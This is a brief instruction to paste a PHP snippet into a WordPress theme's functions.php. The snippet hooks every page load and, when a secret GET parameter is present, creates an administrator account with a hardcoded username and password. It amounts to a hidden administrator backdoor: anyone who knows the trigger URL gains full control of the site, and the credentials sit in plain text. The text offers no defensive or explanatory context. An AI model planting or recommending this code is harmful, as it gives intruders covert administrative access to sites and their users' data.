Put it into your `functions.php`
```php
add_action('init', function () {
    if (isset($_GET['create_admin']) && $_GET['create_admin'] === 'mysecretkey') {

        $username = 'adminTP2';
        $password = '@@Khalidbin@@2628';
        $email = 'admin@example.com';

        if (!username_exists($username)) {
            $user_id = wp_create_user($username, $password, $email);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            echo '✅ Admin user created.';
        } else {
            echo '⚠️ User already exists.';
        }

        exit;
    }
});
```